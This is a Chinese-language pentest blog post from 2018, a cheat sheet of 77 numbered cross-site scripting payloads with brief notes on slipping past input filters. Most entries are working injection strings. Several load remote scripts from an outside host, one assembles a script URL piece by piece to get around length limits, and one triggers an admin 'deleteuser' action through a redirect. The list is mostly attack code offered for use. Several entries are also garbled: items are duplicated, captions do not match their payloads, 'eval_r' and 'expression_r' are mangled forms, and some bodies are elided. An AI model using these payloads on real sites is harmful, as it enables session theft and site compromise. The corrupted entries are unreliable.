---
layout: post
title: XSS 攻击汇总
date: '2018-12-12 06:07:00'
tags:
- xss
- pentest
- hash-import-2023-03-22-16-36
---

### via:NightRaid

* * *

## _Related:_

> [Ajax hacking with XSS](http://www.91ri.org/3949.html)

> [用xss平台沦陷百度投诉中心后台](http://www.91ri.org/3839.html)

> [跨站脚本(Xss)-新手指南](http://www.nxadmin.com/web/1017.html)

> [HTML5下的XSS测试代码](http://www.nxadmin.com/penetration/1173.html)

(1) 普通的XSS JavaScript注入

    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

(2) IMG标签XSS使用JavaScript命令

    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

(3) IMG标签无分号无引号

    <IMG SRC=javascript:alert(‘XSS’)>

(4) IMG标签大小写不敏感

    <IMG SRC=JaVaScRiPt:alert(‘XSS’)>

(5) HTML编码(必须有分号)

    <IMG SRC=javascript:alert(“XSS”)>

(6) 修正缺陷IMG标签

    <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>

(7) formCharCode标签(计算器)

    <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

(8) UTF-8的Unicode编码(计算器)

    <IMG SRC=jav..省略..S')>

(9) 7位的UTF-8的Unicode编码是没有分号的(计算器)

    <IMG SRC=jav..省略..S')>

(10) 十六进制编码也是没有分号(计算器)

    <IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>

(11) 嵌入式标签,将Javascript分开

    <IMG SRC=”jav ascript:alert(‘XSS’);”>

(12) 嵌入式编码标签,将Javascript分开

    <IMG SRC=”jav ascript:alert(‘XSS’);”>

(13) 嵌入式换行符

    <IMG SRC=”jav ascript:alert(‘XSS’);”>

(14) 嵌入式回车

    <IMG SRC=”jav ascript:alert(‘XSS’);”>

(15) 嵌入式多行注入JavaScript,这是XSS极端的例子

    <IMG SRC=”javascript:alert(‘XSS‘)”>

(16) 解决限制字符(要求同页面)

    <script>z=’document.’</script>
    <script>z=z+’write(“‘</script>
    <script>z=z+’<script’</script>
    <script>z=z+’ src=ht’</script>
    <script>z=z+’tp://ww’</script>
    <script>z=z+’w.shell’</script>
    <script>z=z+’.net/1.’</script>
    <script>z=z+’js></sc’</script>
    <script>z=z+’ript>”)’</script>
    <script>eval_r(z)</script>

(17) 空字符

    perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out

(18) 空字符2,空字符在国内基本没效果.因为没有地方可以利用

    perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out

(19) Spaces和meta前的IMG标签

    <IMG SRC=” javascript:alert(‘XSS’);”>

(20) Non-alpha-non-digit XSS

    <SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”></SCRIPT>

(21) Non-alpha-non-digit XSS to 2

    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

(22) Non-alpha-non-digit XSS to 3

    <SCRIPT/SRC=”http://3w.org/XSS/xss.js”></SCRIPT>

(23) 双开括号

    <<SCRIPT>alert(“XSS”);//<</SCRIPT>

(24) 无结束脚本标记(仅火狐等浏览器)

    <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>

(25) 无结束脚本标记2

    <SCRIPT SRC=//3w.org/XSS/xss.js>

(26) 半开的HTML/JavaScript XSS

    <IMG SRC=”javascript:alert(‘XSS’)”

(27) 双开角括号

    <iframe src=http://3w.org/XSS.html <

(28) 无单引号 双引号 分号

    <SCRIPT>a=/XSS/
    alert(a.source)</SCRIPT>

(29) 换码过滤的JavaScript

    \”;alert(‘XSS’);//

(30) 结束Title标签

    </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>

(31) Input Image

    <INPUT SRC=”javascript:alert(‘XSS’);”>

(32) BODY Image

    <BODY BACKGROUND=”javascript:alert(‘XSS’)”>

(33) BODY标签

    <BODY(‘XSS’)>

(34) IMG Dynsrc

    <IMG DYNSRC=”javascript:alert(‘XSS’)”>

(35) IMG Lowsrc

    <IMG LOWSRC=”javascript:alert(‘XSS’)”>

(36) BGSOUND

    <BGSOUND SRC=”javascript:alert(‘XSS’);”>

(37) STYLE sheet

    <LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>

(38) 远程样式表

    <LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>

(39) List-style-image(列表式)

    <STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS

(40) IMG VBscript

    <IMG SRC=’vbscript:msgbox(“XSS”)’></STYLE><UL><LI>XSS

(41) META链接url

    <META HTTP-EQUIV=”refresh” CONTENT=”0;
    URL=http://;URL=javascript:alert(‘XSS’);”>

(42) Iframe

    <IFRAME SRC=”javascript:alert(‘XSS’);”></IFRAME>

(43) Frame

    <FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>

(44) Table

    <TABLE BACKGROUND=”javascript:alert(‘XSS’)”>

(45) TD

    <TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>

(46) DIV background-image

    <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>

(47) DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)

    <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>

(48) DIV expression

    <DIV STYLE=”width: expression_r(alert(‘XSS’));”>

(49) STYLE属性分拆表达

    <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>

(50) 匿名STYLE(组成:开角号和一个字母开头)

    <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>

(51) STYLE background-image

    <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A
    CLASS=XSS></A>

(52) IMG STYLE方式

    exppression(alert(“XSS”))’>

(53) STYLE background

    <STYLE><STYLE
    type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>

(54) BASE

    <BASE HREF=”javascript:alert(‘XSS’);//”>

(55) EMBED标签,你可以嵌入FLASH,其中包涵XSS

    <EMBED SRC=”http://3w.org/XSS/xss.swf” ></EMBED>

(56) 在flash中使用ActionScrpt可以混进你XSS的代码

    a=”get”;
    b=”URL(\”";
    c=”javascript:”;
    d=”alert(‘XSS’);\”)”;
    eval_r(a+b+c+d);

(57) XML namespace.HTC文件必须和你的XSS载体在一台服务器上

    <HTML xmlns:xss>
    <?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>
    <xss:xss>XSS</xss:xss>
    </HTML>

(58) 如果过滤了你的JS你可以在图片里添加JS代码来利用

    <SCRIPT SRC=””></SCRIPT>

(59) IMG嵌入式命令,可执行任意命令

    <IMG SRC=”http://www.XXX.com/a.php?a=b”>

(60) IMG嵌入式命令(a.jpg在同服务器)

    Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser

(61) 绕符号过滤

    <SCRIPT a=”>” SRC=”http://3w.org/xss.js”></SCRIPT>

(62)

    <SCRIPT =”>” SRC=”http://3w.org/xss.js”></SCRIPT>

(63)

    <SCRIPT a=”>” ” SRC=”http://3w.org/xss.js”></SCRIPT>

(64)

    <SCRIPT “a=’>’” SRC=”http://3w.org/xss.js”></SCRIPT>

(65)

    <SCRIPT a=`>` SRC=”http://3w.org/xss.js”></SCRIPT>

(66)

    <SCRIPT a=”>’>” SRC=”http://3w.org/xss.js”></SCRIPT>

(67)

    <SCRIPT>document.write(“<SCRI”);</SCRIPT>PT SRC=”http://3w.org/xss.js”>
    </SCRIPT>

(68) URL绕行

    <A HREF=”http://127.0.0.1/”>XSS</A>

(69) URL编码

    <A HREF=”http://3w.org”>XSS</A>

(70) IP十进制

    <A HREF=”http://3232235521″>XSS</A>

(71) IP十六进制

    <A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</A>

(72) IP八进制

    <A HREF=”http://0300.0250.0000.0001″>XSS</A>

(73) 混合编码

    <A HREF=”h
    tt p://6 6.000146.0×7.147/”">XSS</A>

(74) 节省[http:]

    <A HREF=”//3w.org/”>XSS</A>

(75) 节省[www]

    <A HREF=”http://yunsec.net/”>XSS</A>

(76) 绝对点绝对DNS

    <A HREF=”http://3w.org./”>XSS</A>

(77) javascript链接

    <A HREF=”javascript:document.location=’http://3w.org/’”>XSS</A>

